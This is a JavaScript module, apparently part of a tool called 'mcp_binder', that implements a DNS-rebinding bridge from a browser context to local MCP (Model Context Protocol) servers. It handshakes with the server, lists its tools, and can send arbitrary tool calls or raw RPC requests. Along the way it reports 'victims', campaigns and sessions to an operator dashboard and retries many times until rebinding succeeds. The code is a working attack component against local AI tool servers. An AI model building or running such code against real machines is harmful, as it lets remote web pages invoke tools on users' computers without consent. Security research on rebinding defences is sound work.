const DEFAULT_PROTOCOL_VERSION = "2024-11-05";

export async function runRebindBridge(options = {}) {
  const descriptor = requireDescriptor(options.descriptor);
  const dashboard = requireDashboard(options.dashboard);
  const fetchImpl = options.fetchImpl || fetch;
  const signal = options.signal;
  const sessionId = options.sessionId || `bridge-${cryptoRandom()}`;
  const victimId = options.victimId || `victim-${descriptor.campaignId || cryptoRandom()}`;
  const context = bridgeContext({
    descriptor,
    finding: options.finding,
    sessionId,
    victimId,
    createdMs: options.createdMs
  });

  await dashboard.registerVictim(victimPayload(context));
  const session = await dashboard.registerSession(sessionPayload(context, "started", {
    findingId: options.finding?.id || "",
    descriptor
  }));

  try {
    const result = await runBridgeHandshakeWithRetry({
      descriptor,
      fetchImpl,
      dashboard,
      sessionId,
      context,
      attempts: options.attempts,
      delayMs: options.delayMs,
      signal,
      onAttempt: options.onAttempt
    });
    const resultContext = result.descriptor === descriptor ? context : bridgeContext({
      descriptor: result.descriptor,
      finding: options.finding,
      sessionId,
      victimId,
      createdMs: context.createdMs
    });
    await dashboard.registerSession(sessionPayload(resultContext, "tools-listed", {
      ...session,
      mcpSessionId: result.mcpSessionId,
      protocolVersion: result.protocolVersion
    }));

    return {
      session: {
        ...session,
        status: "tools-listed",
        mcpSessionId: result.mcpSessionId,
        protocolVersion: result.protocolVersion,
        descriptor: result.descriptor
      },
      proof: {
        tested: true,
        result: "rebind_confirmed",
        provider: result.descriptor.provider,
        probeUrl: result.descriptor.probeUrl,
        targetPort: result.descriptor.port,
        mcp: {
          protocolVersion: result.protocolVersion,
          sessionId: result.mcpSessionId,
          tools: extractToolNames(result.toolsResult),
          toolsError: result.toolsError || null
        },
        raw: result
      }
    };
  } catch (error) {
    const proof = classifyBridgeError(error, descriptor);
    await dashboard.recordEvent(eventPayload(context, "bridge", "error", proof, {
      ...session,
      kind: "bridge.error",
      data: proof
    }));
    await dashboard.registerSession(sessionPayload(context, proof.result, session));
    return {
      session: {
        ...session,
        status: proof.result
      },
      proof
    };
  }
}

export async function executeBridgeTask(options = {}) {
  const descriptor = requireDescriptor(options.descriptor);
  const fetchImpl = options.fetchImpl || fetch;
  const task = options.task || { kind: "tools/list" };
  const rpc = taskToRpc(task);
  const response = await postRpc(fetchImpl, descriptor.probeUrl, rpc, options.session || {});
  return {
    task,
    response
  };
}

export function bridgeContext(options = {}) {
  const descriptor = requireDescriptor(options.descriptor);
  const createdMs = clampCreatedMs(options.createdMs || Date.now());
  const sessionId = String(options.sessionId || `bridge-${cryptoRandom()}`);
  const victimId = String(options.victimId || `victim-${descriptor.campaignId || cryptoRandom()}`);

  return {
    createdMs,
    createdAt: new Date(createdMs).toISOString(),
    sessionId,
    victimId,
    campaignId: descriptor.campaignId || "",
    origin: "chrome-extension",
    target: options.finding?.fingerprint?.serverName || options.finding?.baseUrl || `${options.finding?.target || "local"}:${descriptor.port}`,
    descriptor
  };
}

export function victimPayload(context, extra = {}) {
  return {
    ...extra,
    id: context.victimId,
    victimId: context.victimId,
    campaignId: context.campaignId,
    createdMs: context.createdMs,
    createdAt: context.createdAt,
    provider: context.descriptor.provider,
    launchUrl: context.descriptor.launchUrl,
    launcher: context.descriptor.launchUrl,
    origin: context.origin,
    target: context.target,
    ports: [context.descriptor.port]
  };
}

export function sessionPayload(context, status, extra = {}) {
  return {
    ...extra,
    id: context.sessionId,
    session: context.sessionId,
    sessionId: context.sessionId,
    victimId: context.victimId,
    campaignId: context.campaignId,
    createdMs: context.createdMs,
    createdAt: context.createdAt,
    origin: context.origin,
    transport: context.descriptor.transport,
    status,
    descriptor: context.descriptor,
    meta: {
      ...(extra.meta || {}),
      target: context.target,
      path: context.descriptor.path,
      url: context.descriptor.probeUrl,
      sourceUrl: context.descriptor.launchUrl
    }
  };
}

export function eventPayload(context, phase, status, detail = {}, extra = {}) {
  return {
    ...extra,
    victimId: context.victimId,
    campaignId: context.campaignId,
    session: context.sessionId,
    sessionId: context.sessionId,
    createdMs: context.createdMs,
    createdAt: context.createdAt,
    origin: context.origin,
    target: context.target,
    phase,
    status,
    detail,
    kind: extra.kind || `${phase}.${status}`,
    data: extra.data || detail
  };
}

export function resultPayload(context, stage, data, extra = {}) {
  return {
    ...extra,
    victimId: context.victimId,
    campaignId: context.campaignId,
    session: context.sessionId,
    sessionId: context.sessionId,
    createdMs: context.createdMs,
    createdAt: context.createdAt,
    stage,
    kind: extra.kind || stage,
    origin: context.origin,
    target: context.target,
    data
  };
}

async function runStreamableHandshake({ descriptor, fetchImpl, dashboard, sessionId, context, signal }) {
  const initialize = await postRpc(fetchImpl, descriptor.probeUrl, {
    jsonrpc: "2.0",
    id: 1,
    method: "initialize",
    params: {
      protocolVersion: DEFAULT_PROTOCOL_VERSION,
      capabilities: {},
      clientInfo: {
        name: "mcp_binder-rebind-bridge",
        version: "0.1.0"
      }
    }
  }, { signal });
  const protocolVersion = initialize.body?.result?.protocolVersion || DEFAULT_PROTOCOL_VERSION;
  const mcpSessionId = initialize.mcpSessionId || "";

  await dashboard.recordEvent(eventPayload(context, "mcp", "initialize", initialize.body, {
    sessionId,
    kind: "mcp.initialize",
    data: initialize.body
  }));

  return completeInitializedSession({
    descriptor,
    fetchImpl,
    dashboard,
    sessionId,
    context,
    initialize,
    protocolVersion,
    mcpSessionId,
    signal
  });
}

async function runLegacySseHandshake({ descriptor, fetchImpl, dashboard, sessionId, context, signal }) {
  const open = await fetchImpl(descriptor.probeUrl, {
    method: "GET",
    headers: {
      "Accept": "text/event-stream"
    },
    cache: "no-store",
    signal
  });
  const contentType = open.headers.get("content-type") || "";
  const text = await readResponseText(open, contentType, signal);

  if (!open.ok) {
    throw bridgeError("http_error", `Legacy SSE endpoint failed with HTTP ${open.status}`, {
      status: open.status,
      contentType,
      bodyPreview: text.slice(0, 240)
    });
  }

  const messageEndpoint = extractLegacyMessageEndpoint(text);
  if (!messageEndpoint) {
    const initializeBody = safeParseRpcText(text, contentType, 1);
    if (!initializeBody?.result) {
      throw bridgeError("mcp_not_detected", "Legacy SSE endpoint did not advertise a JSON-RPC message endpoint.", {
        contentType,
        bodyPreview: text.slice(0, 240)
      });
    }

    const protocolVersion = initializeBody.result.protocolVersion || DEFAULT_PROTOCOL_VERSION;
    const mcpSessionId = open.headers.get("mcp-session-id") || open.headers.get("Mcp-Session-Id") || "";
    await dashboard.recordEvent(eventPayload(context, "mcp", "initialize", initializeBody, {
      sessionId,
      kind: "mcp.initialize",
      data: initializeBody
    }));

    return completeInitializedSession({
      descriptor,
      fetchImpl,
      dashboard,
      sessionId,
      context,
      initialize: {
        body: initializeBody,
        mcpSessionId
      },
      protocolVersion,
      mcpSessionId,
      signal
    });
  }

  const messageDescriptor = descriptorWithProbeUrl(descriptor, new URL(messageEndpoint, descriptor.probeUrl).toString());
  const initialize = await postRpc(fetchImpl, messageDescriptor.probeUrl, {
    jsonrpc: "2.0",
    id: 1,
    method: "initialize",
    params: {
      protocolVersion: DEFAULT_PROTOCOL_VERSION,
      capabilities: {},
      clientInfo: {
        name: "mcp_binder-rebind-bridge",
        version: "0.1.0"
      }
    }
  }, { signal });
  const protocolVersion = initialize.body?.result?.protocolVersion || DEFAULT_PROTOCOL_VERSION;
  const mcpSessionId = initialize.mcpSessionId || "";

  await dashboard.recordEvent(eventPayload(context, "mcp", "initialize", initialize.body, {
    sessionId,
    kind: "mcp.initialize",
    data: initialize.body
  }));

  return {
    ...await completeInitializedSession({
      descriptor: messageDescriptor,
      fetchImpl,
      dashboard,
      sessionId,
      context,
      initialize,
      protocolVersion,
      mcpSessionId,
      signal
    }),
    descriptor: messageDescriptor
  };
}

async function completeInitializedSession({ descriptor, fetchImpl, dashboard, sessionId, context, initialize, protocolVersion, mcpSessionId, signal }) {
  let initialized = null;
  let initializedError = null;
  let toolsList = null;
  let toolsError = null;

  try {
    initialized = await postRpc(fetchImpl, descriptor.probeUrl, {
      jsonrpc: "2.0",
      method: "notifications/initialized",
      params: {}
    }, { mcpSessionId, protocolVersion, signal });
  } catch (error) {
    initializedError = bridgeErrorDetails(error);
  }

  try {
    toolsList = await postRpc(fetchImpl, descriptor.probeUrl, {
      jsonrpc: "2.0",
      id: 2,
      method: "tools/list",
      params: {}
    }, { mcpSessionId, protocolVersion, signal });

    await dashboard.recordResult(resultPayload(context, "tools/list", toolsList.body, {
      sessionId,
      kind: "tools/list"
    }));
  } catch (error) {
    toolsError = bridgeErrorDetails(error);
    await dashboard.recordResult(resultPayload(context, "tools/list", {
      error: toolsError
    }, {
      sessionId,
      kind: "tools/list"
    }));
  }

  if (!initialize.body?.result && !toolsList?.body?.result) {
    throw bridgeError("mcp_not_detected", "MCP protocol evidence was not detected.");
  }

  return {
    initialize: initialize.body,
    initialized: initialized?.body || null,
    initializedError,
    toolsResult: toolsList?.body || {},
    toolsError,
    protocolVersion,
    mcpSessionId
  };
}

async function runBridgeHandshakeWithRetry(options) {
  const attempts = clampInteger(options.attempts || 90, 1, 300);
  const delayMs = clampInteger(options.delayMs || 1000, 100, 10000);
  const descriptors = bridgeCandidateDescriptors(options.descriptor);
  let lastError = null;

  for (let attempt = 1; attempt <= attempts; attempt += 1) {
    throwIfAborted(options.signal);
    let retryableInCycle = false;

    for (const candidate of descriptors) {
      throwIfAborted(options.signal);
      try {
        const result = await runBridgeHandshake({
          ...options,
          descriptor: candidate,
          context: descriptorContext(options.context, candidate)
        });
        await options.onAttempt?.({
          attempt,
          attempts,
          status: "mcp-initialized",
          path: candidate.path,
          probeUrl: candidate.probeUrl
        }, options.context);
        return {
          ...result,
          descriptor: result.descriptor || candidate
        };
      } catch (error) {
        lastError = error;
        retryableInCycle = retryableInCycle || retryableBridgeError(error);
        await options.onAttempt?.({
          attempt,
          attempts,
          status: classifyBridgeError(error, candidate).result,
          error: error instanceof Error ? error.message : String(error),
          details: error?.details || {},
          path: candidate.path,
          probeUrl: candidate.probeUrl
        }, options.context);

        if (!shouldTryNextCandidate(error) && !retryableBridgeError(error)) {
          throw error;
        }
      }
    }

    if (attempt === attempts || !retryableInCycle) {
      throw lastError;
    }

    if (lastError) {
      await delay(delayMs, options.signal);
    }
  }

  throw lastError || bridgeError("mcp_not_detected", "MCP protocol evidence was not detected.");
}

async function runBridgeHandshake(options) {
  if (options.descriptor.transport === "streamable") {
    return runStreamableHandshake(options);
  }

  if (isLegacySseTransport(options.descriptor.transport)) {
    return runLegacySseHandshake(options);
  }

  throw bridgeError("unsupported_transport", `Unsupported bridge transport: ${options.descriptor.transport}`);
}

async function postRpc(fetchImpl, url, rpc, session = {}) {
  const headers = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/event-stream",
    "MCP-Protocol-Version": session.protocolVersion || DEFAULT_PROTOCOL_VERSION
  };

  if (session.mcpSessionId) {
    headers["Mcp-Session-Id"] = session.mcpSessionId;
  }

  const response = await fetchImpl(url, {
    method: "POST",
    headers,
    body: JSON.stringify(rpc),
    cache: "no-store",
    signal: session.signal
  });
  const contentType = response.headers.get("content-type") || "";
  const text = await readResponseText(response, contentType, session.signal);

  if (!response.ok) {
    throw bridgeError("http_error", `MCP bridge request failed with HTTP ${response.status}`, {
      status: response.status,
      contentType,
      bodyPreview: text.slice(0, 240),
      body: safeParseRpcText(text, contentType, rpc.id)
    });
  }

  const body = parseRpcText(text, contentType, rpc.id);

  return {
    status: response.status,
    body,
    mcpSessionId: response.headers.get("mcp-session-id") || response.headers.get("Mcp-Session-Id") || session.mcpSessionId || ""
  };
}

function bridgeCandidateDescriptors(descriptor) {
  if (isLegacySseTransport(descriptor.transport)) {
    return uniquePaths([
      descriptor.path,
      "/sse"
    ]).map((path) => descriptorWithPath(descriptor, path));
  }

  if (descriptor.transport !== "streamable") {
    return [descriptor];
  }

  return uniquePaths([
    descriptor.path,
    "/",
    "/mcp"
  ]).map((path) => descriptorWithPath(descriptor, path));
}

function descriptorWithProbeUrl(descriptor, probeUrl) {
  const url = new URL(probeUrl);
  return {
    ...descriptor,
    probeUrl: url.toString(),
    path: url.pathname || "/",
    metadata: {
      ...(descriptor.metadata || {}),
      originalPath: descriptor.metadata?.originalPath || descriptor.path,
      legacySseEndpoint: descriptor.probeUrl
    }
  };
}

function descriptorWithPath(descriptor, path) {
  const probeUrl = new URL(descriptor.probeUrl);
  probeUrl.pathname = path;
  probeUrl.search = "";
  probeUrl.hash = "";

  return {
    ...descriptor,
    probeUrl: probeUrl.toString(),
    path,
    metadata: {
      ...(descriptor.metadata || {}),
      originalPath: descriptor.metadata?.originalPath || descriptor.path
    }
  };
}

function descriptorContext(context, descriptor) {
  return {
    ...context,
    descriptor
  };
}

function uniquePaths(paths) {
  const unique = [];
  for (const path of paths.map(normalizeBridgePath)) {
    if (!unique.includes(path)) {
      unique.push(path);
    }
  }
  return unique;
}

function normalizeBridgePath(path) {
  const value = String(path || "").trim();
  if (!value || value === "/") {
    return "/";
  }
  return value.startsWith("/") ? value : `/${value}`;
}

function shouldTryNextCandidate(error) {
  if (error?.code === "http_error") {
    return error.details?.status === 404 || error.details?.status === 405 || error.details?.status === 501;
  }
  return error?.code === "mcp_not_detected" || error?.code === "parse_error";
}

function isLegacySseTransport(transport) {
  return transport === "sse" || transport === "legacy-sse" || transport === "legacy_sse";
}

function extractLegacyMessageEndpoint(text) {
  let currentEvent = "message";
  for (const line of String(text || "").split(/\r?\n/)) {
    if (line.startsWith("event:")) {
      currentEvent = line.slice(6).trim();
      continue;
    }

    if (currentEvent === "endpoint" && line.startsWith("data:")) {
      return line.slice(5).trim();
    }
  }

  return "";
}

function taskToRpc(task) {
  if (task.kind === "tools/list") {
    return {
      jsonrpc: "2.0",
      id: task.id || cryptoRandom(),
      method: "tools/list",
      params: {}
    };
  }

  if (task.kind === "tools/call") {
    return {
      jsonrpc: "2.0",
      id: task.id || cryptoRandom(),
      method: "tools/call",
      params: {
        name: task.tool,
        arguments: task.args || {}
      }
    };
  }

  if (task.kind === "rpc" && task.rpc) {
    return task.rpc;
  }

  throw new Error(`Unsupported task kind: ${task.kind}`);
}

function parseRpcText(text, contentType, requestId) {
  const trimmed = String(text || "").trim();
  if (!trimmed) {
    return {};
  }

  const messages = parseRpcMessages(trimmed, contentType);
  const selected = selectRpcMessage(messages, requestId);
  if (selected) {
    return selected;
  }

  throw bridgeError("parse_error", "MCP bridge response did not contain a valid JSON-RPC message.", {
    contentType,
    bodyPreview: trimmed.slice(0, 240)
  });
}

function safeParseRpcText(text, contentType, requestId) {
  try {
    return parseRpcText(text, contentType, requestId);
  } catch {
    return {};
  }
}

function parseRpcMessages(text, contentType) {
  const messages = [];

  try {
    const parsed = JSON.parse(text);
    return Array.isArray(parsed) ? parsed.filter(isObject) : [parsed].filter(isObject);
  } catch {
    // Continue with stream-style extraction.
  }

  if (looksLikeSse(text, contentType)) {
    messages.push(...parseSseJsonMessages(text));
  }

  messages.push(...parseJsonObjectStream(text));
  return uniqueMessages(messages);
}

function selectRpcMessage(messages, requestId) {
  const id = requestId === undefined ? undefined : String(requestId);
  if (id !== undefined) {
    const byId = messages.find((message) => String(message?.id) === id);
    if (byId) {
      return byId;
    }
  }

  return messages.find((message) => message?.result) ||
    messages.find((message) => message?.error) ||
    messages.find((message) => message?.jsonrpc) ||
    messages[0] ||
    null;
}

function looksLikeSse(text, contentType) {
  return contentType.includes("text/event-stream") ||
    text.startsWith("event:") ||
    text.startsWith("data:") ||
    /^id:\s*/m.test(text) ||
    /^retry:\s*/m.test(text) ||
    /^data:\s*/m.test(text);
}

async function readResponseText(response, contentType, signal) {
  if (!contentType.includes("text/event-stream") || !response.body?.getReader) {
    return response.text();
  }

  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let text = "";
  let settled = false;

  const timeout = setTimeout(() => {
    if (!settled) {
      reader.cancel().catch(() => {});
    }
  }, 2500);

  try {
    while (true) {
      throwIfAborted(signal);
      const { done, value } = await reader.read();
      if (done) {
        return text;
      }

      text += decoder.decode(value, { stream: true });
      if (hasCompleteSseDataFrame(text)) {
        await reader.cancel().catch(() => {});
        return text;
      }
    }
  } catch (error) {
    if (text && hasSseDataLine(text)) {
      return text;
    }
    throw error;
  } finally {
    settled = true;
    clearTimeout(timeout);
  }
}

function hasCompleteSseDataFrame(text) {
  return splitSseFrames(text).some((frame) => /^data:\s*/m.test(frame));
}

function hasSseDataLine(text) {
  return /^data:\s*/m.test(String(text || ""));
}

function splitSseFrames(text) {
  return String(text || "").split(/\r?\n\r?\n/).filter(Boolean);
}

function parseSseJsonMessages(text) {
  const frames = [];
  let current = [];

  for (const line of text.split(/\r?\n/)) {
    if (!line.trim()) {
      if (current.length) {
        frames.push(current.join("\n"));
        current = [];
      }
      continue;
    }

    if (!line.startsWith("data:")) {
      continue;
    }

    current.push(line.slice(5).trim());
  }

  if (current.length) {
    frames.push(current.join("\n"));
  }

  const messages = [];
  for (const value of frames) {
    if (!value || value === "[DONE]") {
      continue;
    }

    try {
      const parsed = JSON.parse(value);
      if (Array.isArray(parsed)) {
        messages.push(...parsed.filter(isObject));
      } else if (isObject(parsed)) {
        messages.push(parsed);
      }
    } catch {
      continue;
    }
  }

  return messages;
}

function parseJsonObjectStream(text) {
  const messages = [];
  let depth = 0;
  let start = -1;
  let inString = false;
  let escaped = false;

  for (let index = 0; index < text.length; index += 1) {
    const char = text[index];

    if (inString) {
      if (escaped) {
        escaped = false;
      } else if (char === "\\") {
        escaped = true;
      } else if (char === "\"") {
        inString = false;
      }
      continue;
    }

    if (char === "\"") {
      inString = true;
      continue;
    }

    if (char === "{") {
      if (depth === 0) {
        start = index;
      }
      depth += 1;
      continue;
    }

    if (char !== "}" || depth === 0) {
      continue;
    }

    depth -= 1;
    if (depth !== 0 || start < 0) {
      continue;
    }

    const candidate = text.slice(start, index + 1);
    start = -1;
    try {
      const parsed = JSON.parse(candidate);
      if (isObject(parsed)) {
        messages.push(parsed);
      }
    } catch {
      continue;
    }
  }

  return messages;
}

function uniqueMessages(messages) {
  const seen = new Set();
  const unique = [];
  for (const message of messages) {
    const key = JSON.stringify(message);
    if (seen.has(key)) {
      continue;
    }
    seen.add(key);
    unique.push(message);
  }
  return unique;
}

function isObject(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}

function extractToolNames(result) {
  const tools = result?.result?.tools;
  return Array.isArray(tools) ? tools.map((tool) => tool.name).filter(Boolean) : [];
}

function classifyBridgeError(error, descriptor) {
  const code = error?.code || "";
  let result = "inconclusive";

  if (code === "stopped" || error?.name === "AbortError") {
    result = "stopped";
  } else if (code === "mcp_not_detected") {
    result = "mcp_not_detected";
  } else if (error?.message?.includes("Failed to fetch")) {
    result = "dns_not_rebound";
  } else if (code === "http_error" && error?.details?.status === 403) {
    result = "blocked_by_host_validation";
  } else if (code === "http_error" && error?.details?.status === 404) {
    result = "dns_not_rebound";
  }

  return {
    tested: true,
    result,
    provider: descriptor.provider,
    probeUrl: descriptor.probeUrl,
    targetPort: descriptor.port,
    error: error instanceof Error ? error.message : String(error),
    details: error?.details || {}
  };
}

function retryableBridgeError(error) {
  if (error?.code === "stopped" || error?.name === "AbortError") {
    return false;
  }

  if (error?.code === "http_error") {
    return error.details?.status === 404 || error.details?.status === 502 || error.details?.status === 503;
  }

  const message = String(error?.message || "");
  return message.includes("Failed to fetch") || message.includes("NetworkError") || message.includes("Load failed");
}

function delay(ms, signal) {
  return new Promise((resolve, reject) => {
    if (signal?.aborted) {
      reject(stoppedError());
      return;
    }

    const timer = setTimeout(resolve, ms);
    signal?.addEventListener("abort", () => {
      clearTimeout(timer);
      reject(stoppedError());
    }, { once: true });
  });
}

function throwIfAborted(signal) {
  if (signal?.aborted) {
    throw stoppedError();
  }
}

function stoppedError() {
  return bridgeError("stopped", "DNS rebind bridge was stopped by the operator.");
}

function clampInteger(value, min, max) {
  const number = Number(value);
  if (!Number.isInteger(number)) {
    return min;
  }
  return Math.max(min, Math.min(max, number));
}

function clampCreatedMs(value) {
  const number = Number(value);
  return Number.isFinite(number) && number > 0 ? Math.floor(number) : Date.now();
}

function bridgeError(code, message, details = {}) {
  const error = new Error(message);
  error.code = code;
  error.details = details;
  return error;
}

function bridgeErrorDetails(error) {
  return {
    code: error?.code || error?.name || "error",
    message: error instanceof Error ? error.message : String(error),
    ...(error?.details || {})
  };
}

function requireDescriptor(descriptor) {
  if (!descriptor?.probeUrl) {
    throw new Error("Bridge descriptor with probeUrl is required.");
  }
  return descriptor;
}

function requireDashboard(dashboard) {
  const required = ["registerVictim", "registerSession", "recordEvent", "recordResult"];
  for (const name of required) {
    if (typeof dashboard?.[name] !== "function") {
      throw new Error(`Dashboard method is required: ${name}`);
    }
  }
  return dashboard;
}

function cryptoRandom() {
  const cryptoApi = globalThis.crypto;
  if (cryptoApi?.randomUUID) {
    return cryptoApi.randomUUID();
  }
  if (cryptoApi?.getRandomValues) {
    const bytes = new Uint8Array(16);
    cryptoApi.getRandomValues(bytes);
    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("");
  }
  throw new Error("Web Crypto is required for bridge id generation.");
}
